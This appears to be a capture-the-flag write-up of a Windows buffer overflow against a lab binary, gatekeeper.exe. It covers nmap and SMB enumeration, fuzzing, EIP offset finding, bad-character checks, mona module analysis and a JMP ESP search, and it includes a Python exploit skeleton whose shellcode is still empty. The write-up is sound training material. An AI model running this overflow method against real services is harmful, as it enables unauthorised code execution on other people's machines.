# GateKeeper

## Nmap enumeration 
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
└─$ nmap -Pn -sV -n -sC --script=vuln  10.48.161.34  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 18:47 +1000
Nmap scan report for 10.48.161.34
Host is up (0.42s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.99%I=7%D=5/30%Time=6A1AA448%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 262.43 seconds
                                                                                 
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
```
Interesting ITEMS: 
- SMB 135,139,445 likely host is Windows
- RDP 3389
- Elite? 31337
- 49152/tcp open  msrpc        Microsoft Windows RPC
- 49153/tcp open  msrpc        Microsoft Windows RPC
- 49154/tcp open  msrpc        Microsoft Windows RPC
- 49167/tcp open  msrpc        Microsoft Windows RPC
- Scan results include 'Hello GET /nice ports,/Trinity.txt.bak HTTP/1.0'

## Elite 31337 check with netcat

A quick look show this is likely out target for buffer overflow exploit
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/GateKeeper]
└─$ nc 10.48.161.34 31337             
Hello !!!
TEST
Hello TEST!!!
help
Hello help!!!
```

## SMB seems first place to look, found gatekeeper.exe file download and test next
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
└─$ smbclient -L 10.48.161.34 -L
Password for [WORKGROUP\hacktopuser]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.161.34 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
...
└─$ smbclient  \\\\10.48.161.34\\Users
...
smb: \> ls
...
  Default                           DHR        0  Tue Jul 14 17:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 14:54:24 2009
  Share                               D        0  Fri May 15 11:58:07 2020

                7863807 blocks of size 4096. 3832464 blocks available
smb: \> cd Share
smb: \Share\> ls
...
  gatekeeper.exe                      A    13312  Mon Apr 20 15:27:17 2020
...
smb: \Share\> GET gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
```

## Quick check of gatekeeper.exe file

Transferred to Windows 8 PC and installed the VCRUNTIME140.dll for C++ support. Then run and sure enough its same port 31337. VIA quick nmap scan.
Server side:
```
[+] Listening for connections.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 1       <--no response  at first on client end pressed enter displays Hello!!!
Bytes sent: 47          <--put in a-z1-0 and enter 47 characters
Client disconnected.    <--ctrl C client end no surprise
```
Client side:
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/GateKeeper]
└─$ nc 192.168.0.199 31337     

Hello !!!
abcdefghijklmnopqrstuvwxyz12334567890
Hello abcdefghijklmnopqrstuvwxyz12334567890!!!
```

## Iterate for point of failure of input
- Tart with python script for sending characters volume to determine how much will crash it. 
- Use immunity debugger to observe EIP or for crash.
- It crashes between 100 and 150 I will use msf-pattern to determine exact location

```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
└─$ msf-pattern_create -l 150   
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
...                                                                                 
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
└─$ nc 192.168.0.199 31337
                                <---mandatory return line 
Hello !!!
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
...                                                                                 
```
Immunity Debugger gave EIP 39654138 now use msf-patter-offset we find 146 characters before EIP
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
└─$ msf-pattern_offset -q 39654138

[*] Exact match at offset 146
```
Based on this a simple script now contains the following where, BBBB will be our return location later and payload made after badchars checked.
```
import socket
import sys

message = b'A' * 146 + b'B' * 4
nops = b"/x90" * 20
payload = b""

try: 
	print("Sending payload:...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.0.199',31337))
	s.send((b'\r\n'))
	s.send((message + nops + payload + b'\r\n'))
	s.close()

except:
	print("Cannot connect to the server")
	sys.exit()
```
And a quick tests show using BBBB as a return address, we are on target using 146 as padding before EIP, with nop sled after to shell code.
```
EAX FFFFFFFF
ECX 61D56613
EDX 00000000
EBX 0058D030
ESP 003719F0 ASCII "/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90
!!!
"
EBP 41414141
ESI 08041470 gatekeep.08041470
EDI 0058D030
EIP 42424242
```
## Bad char testing

Sent \x01 through to \xFF to look for characters that did not show, Immunity did show full black squares for \x21 and \xFE but on restest by inserting b"\x21\xFE\x21\xFE" before BBBB pushing it beyond it. I could see !■!■ in there place so not bad after all. I will move on assuming only \x00 is bad.

```
00601A80   41414141  AAAA
00601A84   41414141  AAAA
00601A88   41414141  AAAA
00601A8C   FE21FE21  !■!■
00601A90   42424242  BBBB
...
```
Running mona modules it looks like the only candidate for attack is not a DLL its the gatekeeper.exe file itself being the only one with ASLR and NXcompat disabled.
```
- Nr of modules displayed after filters: **21**
- PEB order: **InLoadOrder**

| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                                            |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | ------------------------------------------------------------------------------------------------------------------ |
| 0x731b0000 | 0x731b4000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-convert-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-convert-l1-1-0.dll) 0x540 |
| 0x08040000 | 0x08048000 | 0x00008000 | False  | True    | False | False | False    | False  | -1.0- [gatekeeper.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe) 0x8000             |
| 0x731c0000 | 0x731c4000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-string-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-string-l1-1-0.dll) 0x540   |
| 0x75820000 | 0x75861000 | 0x00041000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll) 0x4140                                              |
| 0x75540000 | 0x75547000 | 0x00007000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [NSI.dll] (C:\Windows\SYSTEM32\NSI.dll) 0x4540                                                      |
| 0x77480000 | 0x775c0000 | 0x00140000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNEL32.DLL] (C:\Windows\SYSTEM32\KERNEL32.DLL) 0x4140                                            |
| 0x77a50000 | 0x77bbe000 | 0x0016e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140                                                  |
| 0x73210000 | 0x73214000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-stdio-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-stdio-l1-1-0.dll) 0x540     |
| 0x75990000 | 0x75a67000 | 0x000d7000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNELBASE.dll] (C:\Windows\SYSTEM32\KERNELBASE.dll) 0x4140                                        |
| 0x77370000 | 0x773c0000 | 0x00050000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [WS2_32.dll] (C:\Windows\SYSTEM32\WS2_32.dll) 0x4140                                                |
| 0x730d0000 | 0x731ac000 | 0x000dc000 | True   | True    | True  | True  | True     | True   | 10.0.10240.16390 [ucrtbase.DLL] (C:\Windows\SYSTEM32\ucrtbase.DLL) 0x4140                                          |
| 0x751e0000 | 0x75234000 | 0x00054000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [bcryptPrimitives.dll] (C:\Windows\SYSTEM32\bcryptPrimitives.dll) 0x41c0                            |
| 0x731d0000 | 0x731d3000 | 0x00003000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-heap-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-heap-l1-1-0.dll) 0x540       |
| 0x75240000 | 0x7524a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                                          |
| 0x73200000 | 0x73204000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-runtime-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-runtime-l1-1-0.dll) 0x540 |
| 0x73470000 | 0x734bb000 | 0x0004b000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [mswsock.dll] (C:\Windows\system32\mswsock.dll) 0x4140                                              |
| 0x731e0000 | 0x731e3000 | 0x00003000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-locale-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-locale-l1-1-0.dll) 0x540   |
| 0x75ab0000 | 0x75b6a000 | 0x000ba000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [RPCRT4.dll] (C:\Windows\SYSTEM32\RPCRT4.dll) 0x4140                                                |
| 0x75250000 | 0x7526e000 | 0x0001e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [SspiCli.dll] (C:\Windows\SYSTEM32\SspiCli.dll) 0x4140                                              |
| 0x73220000 | 0x73235000 | 0x00015000 | True   | True    | True  | True  | True     | True   | 14.44.35211.0 [VCRUNTIME140.dll] (C:\Windows\SYSTEM32\VCRUNTIME140.dll) 0x4140                                     |
| 0x731f0000 | 0x731f5000 | 0x00005000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-math-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-math-l1-1-0.dll) 0x540       |
----------
```
Next use mona command bar to search for JMP ESP in gatekeeper.exe using 
```
!mono -s "\xff\xe4" -m gatekeeper.exe
```
what two locations showed up
```
...
## Results
...
0x080414c3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe), 0x8000
0x080416bf : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe), 0x8000
```


```
